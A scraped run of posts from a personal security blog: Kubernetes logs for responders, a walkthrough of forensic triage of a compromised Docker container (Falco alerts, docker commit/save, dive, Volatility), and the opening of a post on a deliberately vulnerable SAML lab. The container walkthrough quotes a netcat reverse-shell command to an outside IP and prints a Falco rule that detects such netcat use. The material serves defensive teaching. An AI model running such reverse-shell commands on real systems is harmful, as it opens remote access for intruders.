a 3rd part tool such as Falco or some other tool providing runtime detection capabilities we might have an alert such as this one to help confirm and validate our assumptions:\noutput_fields: { container.id: eddba1ff1c56 container.image.repository: docker.io/raesene/alpine-nettools container.image.tag: latest evt.time: 1655578208694767400 fd.name: 100.96.1.23:37794-\u0026gt;100.64.0.1:443 k8s.ns.name: dev k8s.pod.name: nettools proc.cmdline: kubectl get pods -n dev } priority: Notice rule: Contact K8S API Server From Container Kubelet logs The kubelet is the control point for all the comings and goings on the node. Each node in the cluster will have a unique set of kubelet logs. Kubelet logs may be helpful when attempting to confirm when a particular container was started or removed. Depending on how it is configured the logs may have a lot of additional information available as well.\nThis page from RedHat has a handy reference chart for the different log levels available for the kubelet\nLog verbosity Description \u0026ndash;v=0 Always visible to an Operator. \u0026ndash;v=1 A reasonable default log level if you do not want verbosity. \u0026ndash;v=2 Useful steady state information about the service and important log messages that might correlate to significant changes in the system. This is the recommended default log level. \u0026ndash;v=3 Extended information about changes. \u0026ndash;v=4 Debug level verbosity. \u0026ndash;v=6 Display requested resources. \u0026ndash;v=7 Display HTTP request headers. \u0026ndash;v=8 Display HTTP request contents. At the time of writing kops deploys the kubelet with a default log level of 2 /usr/local/bin/kubelet ... --v=2 unless otherwise specified. Below are some sample events that show a container being removed, the nettools pod being removed, and then a few seconds later the nettools pod being created.\nJun 18 19:42:16 ip-172-20-59-66 kubelet[5656]: {\u0026#34;ts\u0026#34;:1655581336241.7104,\u0026#34;caller\u0026#34;:\u0026#34;topologymanager/scope.go:110\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;RemoveContainer\u0026#34;,\u0026#34;v\u0026#34;:0,\u0026#34;containerID\u0026#34;:\u0026#34;9beafc9454c36cf07dec1793128629f2a80bb43ac65aac400458f44d398032a8\u0026#34;} Jun 18 19:42:16 ip-172-20-59-66 kubelet[5656]: {\u0026#34;ts\u0026#34;:1655581336244.2942,\u0026#34;caller\u0026#34;:\u0026#34;kubelet/kubelet.go:2102\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;SyncLoop REMOVE\u0026#34;,\u0026#34;v\u0026#34;:2,\u0026#34;source\u0026#34;:\u0026#34;api\u0026#34;,\u0026#34;pods\u0026#34;:[{\u0026#34;name\u0026#34;:\u0026#34;nettools\u0026#34;,\u0026#34;namespace\u0026#34;:\u0026#34;dev\u0026#34;}]} Jun 18 19:42:34 ip-172-20-59-66 kubelet[5656]: {\u0026#34;ts\u0026#34;:1655581354264.5642,\u0026#34;caller\u0026#34;:\u0026#34;kubelet/kubelet.go:2092\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;SyncLoop ADD\u0026#34;,\u0026#34;v\u0026#34;:2,\u0026#34;source\u0026#34;:\u0026#34;api\u0026#34;,\u0026#34;pods\u0026#34;:[{\u0026#34;name\u0026#34;:\u0026#34;nettools\u0026#34;,\u0026#34;namespace\u0026#34;:\u0026#34;dev\u0026#34;}]} From a responder\u0026rsquo;s point of view, these logs are more than likely not the most helpful but may be a good reference point.\nhost logs / security tools Most hosts within a Kubernetes cluster are going to be Linux. This means that most if not all of the log sources traditionally used to analyze a Linux host can be used to help paint a picture of what has occurred on a compromised cluster. The same applies to 3rd party security tools. We briefly talked about Falco earlier, but other tools such has ossec, sysmon, osquery, and \u0026lt;$$ VENDOR\u0026gt; can all be used to gain more insights into the malicious activity. Please make sure to understand the limits of the tools though, especially when it comes to paid vendor solutions. A lot of the big players are much stronger in Windows and have gaps in visibility when it comes to *nix systems.\nOther places for logs Depending on how the cluster is configured, and what support applications are being utilized there could be several additional places with valuable log information. Does the cluster use a service mesh, are there proxy containers deployed into every pod for the most part? If so, the proxy containers are great source of logs potentially. If it appears to be a pod or application compromise, do not forget to review the application logs and the logs for the application pod if it is still around.\n","permalink":"https://jellyparks.com/posts/k8s-api-logs-for-responders/","summary":"An overview of the Kubernetes api logs. What fields are useful, and some places where log visibility might be missing in most environments.","title":"kubernetes_logs_for_responders"},{"content":" This post is going to focus on the triaging and analysis of a container that has been compromised.\nPIDs Before we get into the actual analysis lets start with a quick overview of how processes exist in containers. When you run PS inside a container you typically get a very short list of running processes and not all of the processes that are currently running on the underlying host. This is due to one of the foundational compoents that make a container a container, namespaces. Linux namespaces isolate the proceses within containers. What does this look like in practice? Lets look.\nTake for example the following line from a ps aux output ran on a host.\nUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 2954 0.0 0.0 4200 740 pts/1 S+ 02:41 0:00 ping 8.8.8.8 We can see this process has a PID of 2954. Looking at pstree we can see this process is a child of bash, which is a child of containerd-shim\nsystemd(1)───containerd-shim(2396)───bash(2604)───ping(2954) If we exec into the container and run the same ps commands we get a completely different pid:\nUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 379 0.0 0.0 4200 740 pts/1 S+ 02:41 0:00 ping 8.8.8.8 This is due to the Linux namespace restricting our view so we can only see processes that exist \u0026ldquo;within\u0026rdquo; the container. If we attempt to kill PID 2954 on the host from within the container we will get an error that no such process exists. We could however kill process 379 without any issue.\nFor a much more indepth explaination I highly reccommend the book Container Security: Fundamental Technology Concepts that Protect Containerized Applications by Liz Rice. Last I checked Aqua security was giving the ebook away for free.\nThe Scene Moving on to a more practical example let\u0026rsquo;s pretend that we get an alert from a Falco agent running on a host. In fact several alerts are generated for this behavior, but for our purposes just the one will be enough to kick of this investigation. Falco is a great tool and free to use. The fact that it is container aware makes very helpful when looking to detect suspicious and malicious behavior in a container environment. The alert which was generated is below:\n{ \u0026#34;output\u0026#34;: \u0026#34;21:39:47.159547041: Warning Netcat runs inside container that allows remote code execution (user=www-data user_loginuid=-1 command=nc 172.31.93.20 9876 -e /bin/sh container_id=60795d68fdee container_name=eloquent_babbage image=webapp:v1.0)\u0026#34;, \u0026#34;priority\u0026#34;: \u0026#34;Warning\u0026#34;, \u0026#34;rule\u0026#34;: \u0026#34;Netcat Remote Code Execution in Container\u0026#34;, \u0026#34;source\u0026#34;: \u0026#34;syscall\u0026#34;, \u0026#34;tags\u0026#34;: [ \u0026#34;mitre_execution\u0026#34;, \u0026#34;network\u0026#34;, \u0026#34;process\u0026#34; ], \u0026#34;time\u0026#34;: \u0026#34;2022-05-10T21:39:47.159547041Z\u0026#34;, \u0026#34;output_fields\u0026#34;: { \u0026#34;container.id\u0026#34;: \u0026#34;60795d68fdee\u0026#34;, \u0026#34;container.image.repository\u0026#34;: \u0026#34;webapp\u0026#34;, \u0026#34;container.image.tag\u0026#34;: \u0026#34;v1.0\u0026#34;, \u0026#34;container.name\u0026#34;: \u0026#34;eloquent_babbage\u0026#34;, \u0026#34;evt.time\u0026#34;: 1652218787159547100, \u0026#34;proc.cmdline\u0026#34;: \u0026#34;nc 172.31.93.20 9876 -e /bin/sh\u0026#34;, \u0026#34;user.loginuid\u0026#34;: -1, \u0026#34;user.name\u0026#34;: \u0026#34;www-data\u0026#34; } } The rule name is Netcat Remote Code Execution in Container (ruh roh). In the output fields section we can see all kinds of useful information such as data about the image, the running container name, the command line associated with the alert, and the user that ran the command. Looking at the rule syntax it is a fairly simple rule.\nspawned_process and container and ((proc.name = \u0026#34;nc\u0026#34; and (proc.args contains \u0026#34;-e\u0026#34; or proc.args contains \u0026#34;-c\u0026#34;)) or (proc.name = \u0026#34;ncat\u0026#34; and (proc.args contains \u0026#34;--sh-exec\u0026#34; or proc.args contains \u0026#34;--exec\u0026#34; or proc.args contains \u0026#34;-e \u0026#34; or proc.args contains \u0026#34;-c \u0026#34; or proc.args contains \u0026#34;--lua-exec\u0026#34;)) ) The output for the rule is:\noutput: \u0026gt; Netcat runs inside container that allows remote code execution (user=%user.name user_loginuid=%user.loginuid command=%proc.cmdline container_id=%container.id container_name=%container.name image=%container.image.repository:%container.image.tag) If we wanted to have additional information such as process id or parent process id in the output we could add that. Hindsight being what it is, had I thought of this before starting to write this post I would have added pid details to the rule output for additional context.\nComparing the rule to the process cmdline included in the output_fields we can see clearly why it was triggered.\nOn the host when we run ps aux we see an output similar to the one below.\nUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND www-data 12520 0.0 0.0 4296 796 ? S 21:53 0:00 sh -c ping -c 4 \u0026amp; nc 172.31.93.20 9876 -e /bin/sh Digging deeper if we run pstree -asp 12520 we see that the nc process is a child of apache2.\npstree -asp 12520 systemd,1 └─containerd-shim,11971 -namespace moby -id 60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216 -address /run/containerd/containerd.sock └─main.sh,11992 /main.sh └─apache2,12323 -k start └─apache2,12336 -k start └─sh,12520 -c ping -c 4 \u0026amp; nc 172.31.93.20 9876 -e /bin/sh └─sh,12522 -c /bin/sh └─sh,12523 nc usage is common in most place where Linux is used. It is not common to see nc as a child process of apache2. At this point several additional alerts from Falco start to roll in, and after speaking with the application owner we learn nc was added to the container for troubleshooting connectivity issues, but they always ran it from a shell in the container as root never as the apache user (not ideal but it is what it is). The app owners also confirmed they have not been doing any testing recently. If this were a real scenario this host would probably be isolated if possible and attempts would be made to understand what kind of data is processed on the machine. Thankfully this is just a lab and all of that is out of scope for this post :-).\nWe know there is an active nc session, but what else has occured in the container? Let\u0026rsquo;s dive into the image a figure it out.\nCarving the running container out First lets grab the eqivilant of a disk image of the running container this. We\u0026rsquo;ll be able to perform an analysis on the image and it also preserves the image in the event that the container is killed. Note: this post mainly focuses on the container itself, opperating within a Kubernetes cluster is highly likely in a scenario similar to this. There are additional things that should occur when performing analysis on a Kubernetes cluster to preserve and protect both the running container and the host that the container is running on. Failure to do so may result in the entire node being terminated and all relevant evidence along with it.\nLets determine the container id where this process lives. We can do this by looking at the -id parameter associated with the containerd-shim process from the pstree command.\n└─containerd-shim,11971 -namespace moby -id 60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216 -address /run/containerd/containerd.sock If multiple containers exist we would need to trace the tree up to the relevant container-shim process. Additionally in our scenario Falco provided the container id in the alert for us.\n\u0026#34;container.id\u0026#34;: \u0026#34;60795d68fdee\u0026#34;, If we want we can run the docker ps command to validate the container is still running.\ndocker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 60795d68fdee webapp:v1.0 \u0026#34;/main.sh\u0026#34; 3 hours ago Up 3 hours 0.0.0.0:80-\u0026gt;80/tcp, :::80-\u0026gt;80/tcp eloquent_babbage Now that we know the container ID we can create an image from the running container preserving any changes that have occured since the container was launched. The commit command below tells docker to create a new image name sec-incident, tag it with 123, and use the running container id 6079 to build the image. Effectivly taking a snapshot of the container as it currently exists.\ndocker commit 6079 sec-incident:123 When we run the docker images command we see our new image, as well as the orignal image the container launched with.\nREPOSITORY TAG IMAGE ID CREATED SIZE sec-incident 123 9f64c8bead0e 21 seconds ago 845MB webapp v1.0 7adda9b17363 3 hours ago 714MB Comparing the sizes of the two images there have been lots of changes within the image since it was first launched. Next we will save the image to disk so it is portable and can be moved to our analysis workstation.\ndocker save sec-incident:123 -o sec-incident.tar It is important to note we are using the docker save command specifying the image we created from the running container instead of the docker export command on the running container. Both will produce a tar file. The biggest difference is that the export command will flatten the image/layer history. Save on the other hand will preserve all of the layer history. For our use case preserving the history is very helpful when analyzing how the image has shifted from its initial launch. From here as an analyst the tar files will more than likely be exported to an analysis machine.\nOnce we are on our analyst workstation we need to perform a docker load on the tar file produced from the docker save command above. This will trigger the following output:\ndocker load \u0026lt; sec-incident.tar a75caa09eb1f: Loading layer [==================================================\u0026gt;] 105MB/105MB 80f9a8427b18: Loading layer [==================================================\u0026gt;] 494.7MB/494.7MB 97a1040801c3: Loading layer [==================================================\u0026gt;] 7.168kB/7.168kB acf8abb873ce: Loading layer [==================================================\u0026gt;] 5.655MB/5.655MB 9713610e6ec4: Loading layer [==================================================\u0026gt;] 5.632kB/5.632kB 73e92d5f2a6c: Loading layer [==================================================\u0026gt;] 5.658MB/5.658MB 585e40f29c46: Loading layer [==================================================\u0026gt;] 114.3MB/114.3MB deeea3c4d56f: Loading layer [==================================================\u0026gt;] 2.048kB/2.048kB 9ef9e3967882: Loading layer [==================================================\u0026gt;] 121.7MB/121.7MB Loaded image: sec-incident-123:latest From this output we can tell there are 9 unique layers to this image.\nWhat is an Image Before progressing any further lets take a step back and talk about what an image is. An image according to docker.com is \u0026ldquo;\u0026hellip;a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries and settings.\u0026rdquo; Technically however an image is just a collection of tar\u0026rsquo;d files/folders. Each layer is a folder within the tar file. Within each layers folder contains information about the layer, and then any files associated with that particular layer.\nIn our example when we extract the sec-incident.tar file we see an output that contains a layer folder, inside of that folder is a VERSION, json, and layer.tar file. Additionally at the root level of the image there is manifest.json, repositories, and a 9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json file. The 9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json file uses the hash of the image. The image hash is a sha256sum of this config file.\ntar -xvf sec-incident.tar 1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/ 1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/VERSION 1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/json 1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/layer.tar 2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/ 2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/VERSION 2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/json 2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/layer.tar 69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/ 69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/VERSION 69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/json 69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/layer.tar 6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/ 6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/VERSION 6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/json 6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/layer.tar 8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/ 8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/VERSION 8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/json 8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/layer.tar 9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/ 9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/VERSION 9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/json 9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/layer.tar 9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/ a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/VERSION a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/json a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/layer.tar c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/ c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/VERSION c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/json c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/layer.tar c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/ c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/VERSION c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/json c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/layer.tar ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/ ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/VERSION ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/json ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/layer.tar caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/ caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/VERSION caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/json caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/layer.tar manifest.json repositories The manifest.json file shows us information about the layers in the image as well as the repo/tags associated with the image\n[ { \u0026#34;Config\u0026#34;: \u0026#34;9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json\u0026#34;, \u0026#34;RepoTags\u0026#34;: [ \u0026#34;sec-incident:123\u0026#34; ], \u0026#34;Layers\u0026#34;: [ \u0026#34;69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/layer.tar\u0026#34;, \u0026#34;9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/layer.tar\u0026#34;, \u0026#34;1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/layer.tar\u0026#34;, \u0026#34;c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/layer.tar\u0026#34;, \u0026#34;c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/layer.tar\u0026#34;, \u0026#34;a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/layer.tar\u0026#34;, \u0026#34;2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/layer.tar\u0026#34;, \u0026#34;caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/layer.tar\u0026#34;, \u0026#34;8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/layer.tar\u0026#34;, \u0026#34;ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/layer.tar\u0026#34;, \u0026#34;6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/layer.tar\u0026#34; ] } ] The repositories file is just meta-data about the image:\n{\u0026#34;sec-incident\u0026#34;:{\u0026#34;123\u0026#34;:\u0026#34;6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2\u0026#34;}} When we look at the 9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json config file we can see all of the layers and what commands were used to create the layer. Below is a snip from the file:\n{ \u0026#34;created\u0026#34;: \u0026#34;2018-10-12T17:49:01.240444043Z\u0026#34;, \u0026#34;created_by\u0026#34;: \u0026#34;/bin/sh -c #(nop) ENTRYPOINT [\\\u0026#34;/main.sh\\\u0026#34;]\u0026#34;, \u0026#34;empty_layer\u0026#34;: true }, { \u0026#34;created\u0026#34;: \u0026#34;2022-05-10T21:32:10.671619454Z\u0026#34;, \u0026#34;created_by\u0026#34;: \u0026#34;/bin/sh -c #(nop) COPY file:2d20aa4eee806c995fcc211ba0077b67c72aa53ac0ba27ec57a721820907c4ff in /bin/nc \u0026#34; }, { \u0026#34;created\u0026#34;: \u0026#34;2022-05-10T21:32:11.329409992Z\u0026#34;, \u0026#34;created_by\u0026#34;: \u0026#34;/bin/sh -c chmod +x /bin/nc\u0026#34; }, { \u0026#34;created\u0026#34;: \u0026#34;2022-05-11T00:38:09.016419258Z\u0026#34; } In the above output we can clearly see the original image launch layer which was created 2018-10-12 by the command /bin/sh -c with the entrypoint of main.sh. Below that we see two additional layers added by the application owner for troubleshooting purposes where they copied nc into the image and then made the file executable /bin/sh -c chmod +x /bin/nc. The last layer only has a timestamp, but no other information. This is the layer where we will want to look because it will contain any changes to the file system since the container was started. Before we start to unpack each layer and manually trompsing through all the files lets make things easier and utilize a tool built specifically to help us visualize the data we want to see.\nDive There are a few different tools that can be used to perform static analysis of a container image. One of my favorites is dive. Dive is \u0026ldquo;a tool for exploring a docker image, layer contents, and discovering ways to shrink the size of your Docker/OCI Image.\u0026rdquo; Obviously for our purposes we do not care about shrinking the image we just want to be able to explore the image at each of the various layers.\nOnce installed on our analysis system we can run the tool with:\ndive sec-incident:123 This will process our image and provide us with a really nice ui to navigate through it.\nOnce the ui loads in the top left panel we can see all of the image layers. Using the arrow keys we can move between the layers. The bottom layer contains all of the changes that occurred since the image was started up to the time we saved the image. In our case ~132MB of changes occured.\nIn the section below we can see the layer details. This includes the ID and Digest. We will use the Id (6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2) later when we go to extract specific files from the image.\nOn the right we can see all of the contents of the filesystem at the current layer. Pressing tab will allow us to use the arrow keys once again to navigate through the file system, space will collapse/expand a folder. This includes files from the previous layers. Dive color codes the files to show files that are new to the layer (green) and those files which have been modified when compared to the previous layer (yellow).\nWe can see that a new php session file was created, and that the access and error log files were modified, likely due to webtraffic to the application. In the image below we see several new files that have been created. Each file is worth digging into deeper to gain some understanding as to what has occurred.\nUnfortunatly dive does not offer the ability to extract a file directly. To dig into the files themselves to better understand what has occured we will have to extract the layer from the raw image file.\nFile Analysis Back in our extracted image folder we can use the layer id identified using Dive to selectivly target the layer we want.\nWe want to carve files out that occured within the most recent layer created for the image. Using the what we learned from Dive we know the layer id we want to explore is 6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2.\nWithin the folder for the layer we will extract the layer.tar file with a tar -xvf layer.tar. This presents us with the changes in the filesystem at the current layer of the image. Using what we learned from Dive above we can navigate to files of interest and begin to inspect them to determine what there intent was.\nIntermission During analysis we learn the curl binary was uploaded in parts and then rebuilt as ifj. A coinminer (xmrig) was also uploaded in parts and rebuilt as the binary 8. Additionally several webshells were uploaded. Given the timestamps of when all of the files appear to have been created it would appear it was the same actor copying the same shell to maintain access in the event that one of the shells was discovered and deleted. The web access logs confirm that the same ip address was used for all of the requests where malicious files started to appear. The webshells were identical copies of a version of Web Shell Orb, a fairly full featured webshell with various capabilities.\nMemory Analysis Collection of memory occurs just as it would for any other Linux host. For this post LiME was used, but avml is also an option. Since this is a lab environment and the scenario is a bit contrived disk analysis tells enough of the story for us to understand what has occurred. If this were a bit more realistic the 8 binary probably would have been deleted from disk and we would either recover it from /proc/\u0026lt;PID\u0026gt;/exe or we would carve it out of memory to perform analysis on it and determine what the binaries purpose was. With that in mind I chose to skip digging into that and instead chose to dig into some special things about container memory analysis with volatility.\nVolatility2 When it comes to memory analysis with volatility there really isn\u0026rsquo;t anything special about analyzing activity that has occurred in a container vs outside on the host. The most important thing to remember is when analyzing processes is to utilize the PID of the suspicious processes on at the host level and not the container native PIDs.\nVolatility3 Container analysis with volatility3 is a little bit different than it is with volatility. The main reason for this is the volatility-docker plugin built by Ofek Shaked \u0026amp; Amir Sheffer. This plugin adds namespace support and various docker specific commands which can aid in understanding the dump.\nOne example is the additional argument added to the suite of ps commands: nsinfo. This argument will display information about the namespace associated with a particular pid.\npython3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime linux.pstree.PsTree --nsinfo Below is a sample output of the pstree module showing nsinfo.\nPID PPID COMM Start Time (UTC) PID in NS UTS NS IPC NS MNT NS NET NS PID NS USER NS * 11971 1 containerd-shim 2022-05-10 21:37:46.453 11971 4026531838 4026531839 4026531840 4026532040 4026531836 4026531837 ** 11992 11971 main.sh 2022-05-10 21:37:46.489 1 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 *** 12323 11992 apache2 2022-05-10 21:37:49.355 308 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 **** 12334 12323 apache2 2022-05-10 21:37:49.428 319 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 **** 12335 12323 apache2 2022-05-10 21:37:49.428 320 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 **** 12336 12323 apache2 2022-05-10 21:37:49.429 321 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 **** 12337 12323 apache2 2022-05-10 21:37:49.429 322 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 ***** 12795 12337 sh 2022-05-11 00:31:20.254 411 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 ****** 12797 12795 sh 2022-05-11 00:31:20.255 413 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 ******* 12798 12797 sh 2022-05-11 00:31:20.261 414 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 ******** 12816 12798 8 2022-05-11 00:33:19.062 430 4026532238 4026532239 4026532237 4026532242 4026532240 4026531837 In the table above we can see main.sh is a child of containerd-shim which indicates this is a process in a container. Additionally the pid for main.sh in the NS (PID in NS column) is 1 which tells us this is the pid used to start the container. Below that we can see other PIDs which are related to host pid 11992, and are in the same namespace. We can use the namespace information to determine all of the pids associated with this container even if they have forked away and no longer appear as child processes. Furthermore this mapping can be really helpful if the initial alert source that triggered the investigation is only showing the PID within the namespace.\nThe docker plugin itself adds several new capabilities. The output below shows the available arguments:\npython3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime linux.docker.Docker -h optional arguments: -h, --help show this help message and exit --detector Detect Docker daemon / containers in memory --ps List of running containers --ps-extended Extended list of running containers --inspect-caps Inspect containers capabilities --inspect-mounts Show a list of containers mounts --inspect-mounts-extended Show detailed list of containers mounts --inspect-networks Show detailed list of containers networks --inspect-networks-extended Show detailed list of containers networks The --detector argument attempts to detect if docker was being used on the system. This can be helpful if you are not sure if docker was being used on the system.\npython3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --detector Volatility 3 Framework 2.1.0 Progress: 100.00 Stacking attempts finished Docker inetrface Docker veth Mounted Overlay FS Containerd-shim is running True True True True --ps and --ps-extended emulates the docker ps command showing all containers within the dump and details about them.\npython3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --ps Volatility 3 Framework 2.1.0 Progress: 100.00 Stacking attempts finished Container ID Command Creation Time (UTC) PID 60795d68fdee main.sh 2022-05-10 16:29:25.908 11992 --- python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --ps-extended Volatility 3 Framework 2.1.0 Progress: 100.00 Stacking attempts finished Creation time (UTC) Command Container ID Is privileged PID Effective UID 2022-05-10 16:29:25.908 main.sh 60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216 False 11992 0 To see the capabilities associated with a container the --inspect-caps argument can be used. Having an understanding of a containers capabilities can help shed light on what possible damage it could cause to the underlying system or neighboring containers. This will generate an output similar to below:\npython3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --inspect-caps Volatility 3 Framework 2.1.0 Progress: 100.00 Stacking attempts finished PID Container ID Effective Capabilities Mask Effective Capabilities Mames 11992 60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216 0xa80425fb CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP The --inspect-networks argument will show the containers and the associated networks. If more than one container is in the same network the truncated container id\u0026rsquo;s are comma seperated.\npython3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --inspect-networks Volatility 3 Framework 2.1.0 Progress: 100.00 Stacking attempts finished Network /16 Segment Containers IDs 172.17 60795d68fdee, \u0026lt;SOME OTHER CONTAINER\u0026gt; ","permalink":"https://jellyparks.com/posts/compromised-container-analysis-primer/","summary":"Walkthrough of basic triaging and analysis of a container which has been compromised.","title":"compromised_container_analysis_primer"},{"content":" What is this thing? I built this app because I wanted to better understand SAML and I wanted to know how to discover, exploit, and remediate vulnearbilities associated with implementations. I created an easily deployable docker environment here that can be spun up on a local machine in about 5 minutes. I also have instructions to split the deployment across multiple hosts.\nThis includes a fully functional IDP and a Service Provider. The Service Provider has several configuration options that allow for post deployment on the fly adjustments to the security stance of the application. When its fully deployed the environment will be similar to the architecture and data flows below:\nNot sure what SAML is or looking for a refesher? Check out the saml_overview page.\nBack Story For this scenario we are Yogi Bear. The Jellystone park staff have had enough of our stealing of picnic baskets. In an effort to track this behavior they have setup \u0026ldquo;Yogi\u0026rsquo;s Saml App\u0026rdquo;. This application allows park visitors to file complaints about our behavior.\nOur goal as Yogi is to gain administrative access to the application via SAML implementation errors and delete the complaints. If we fail there is a possibility that we will be relocated to another park with no picnic baskets.\nSetting up the test environment Quick and Easy Deployment The easiest way to get everything up and running is by cloning the repository and then simply running a quick docker-compose command. The compose command will build the images, and deploy them to the local host.\ngit clone https://github.com/yogisec/VulnerableSAMLApp.git cd VulnerableSAMLApp sudo docker-compose up The Service Provider will be listening on http://127.0.0.1:8000. The IDP will be listening at http://127.0.0.1. Head down to the Features section for login details and more information about the applications.\nSplit Host Deployment In order to split the deployment across two seperate hosts (one an IDP, and the other 